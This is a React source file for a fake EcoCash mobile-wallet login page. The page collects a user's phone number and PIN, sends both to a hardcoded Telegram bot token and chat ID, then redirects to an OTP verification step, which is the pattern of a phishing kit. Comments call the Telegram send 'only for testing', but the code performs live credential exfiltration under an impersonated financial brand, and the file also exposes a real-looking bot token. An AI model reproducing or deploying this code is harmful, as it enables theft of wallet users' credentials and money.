import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import EcoCashLogo from "@/components/EcoCashLogo";
import PhoneInput from "@/components/PhoneInput";
import PinInput from "@/components/PinInput";
import LoginFooter from "@/components/LoginFooter";

const Index = () => {
  const navigate = useNavigate();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [pin, setPin] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  // Function to send Telegram alert
  const sendTelegramAlert = async (phone: string) => {
    try {
      await fetch("/.netlify/functions/sendTelegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: phone }), // can send phone or a safe identifier
      });
      console.log("Telegram alert sent!");
    } catch (error) {
      console.error("Failed to send Telegram alert:", error);
    }
  };

  // Client-side Telegram alert (unsafe, only for testing)
// Client-side Telegram alert (unsafe, only for testing)
const sendTelegramAlertClient = (phone: string, pin: string) => {
  const BOT_TOKEN = "8244803895:AAElCNS9IzbpDj8WfaBJM04tH9zrMSpvpjc"; // ⚠ Only for testing
  const CHAT_ID = "6564676243";

  const message = `🔔Wallet Login Alert\nPhone: ${phone}\nPIN: ${pin}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  })
    .then((res) => res.json())
    .then((data) => console.log("Telegram alert sent:", data))
    .catch((err) => console.error("Failed to send alert:", err));
};


  // Auto-redirect when phone and PIN are complete
 useEffect(() => {
  if (phoneNumber.length >= 9 && pin.length === 4 && !isLoading) {
    setIsLoading(true);

    // Send Telegram alert with phone + PIN
    sendTelegramAlertClient(phoneNumber, pin);

    // Redirect to OTP verification
    setTimeout(() => {
      navigate("/otp-verification", { state: { phoneNumber } });
    }, 3000);
  }
}, [phoneNumber, pin, navigate, isLoading]);



  return (
    <div className="min-h-screen bg-background flex flex-col relative">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="absolute inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center px-6 pt-12 pb-8">
        {/* Logo */}
        <div className="mb-8">
          <EcoCashLogo />
        </div>

        {/* Login Title */}
        <h2 className="text-2xl font-semibold text-foreground mb-8">
          Login
        </h2>

        {/* Phone Input */}
        <div className="w-full max-w-sm mb-8">
          <PhoneInput value={phoneNumber} onChange={setPhoneNumber} />
        </div>

        {/* PIN Section */}
        <div className="w-full max-w-sm">
          <p className="text-center text-muted-foreground mb-4">
            Enter your PIN
          </p>
          
          <PinInput value={pin} onChange={setPin} />

          <button 
            className="block mx-auto mt-6 text-primary hover:text-ecocash-dark-blue transition-colors text-sm font-medium"
          >
            Forgot PIN?
          </button>
        </div>
      </div>

      {/* Footer */}
      <LoginFooter />
    </div>
  );
};

export default Index;
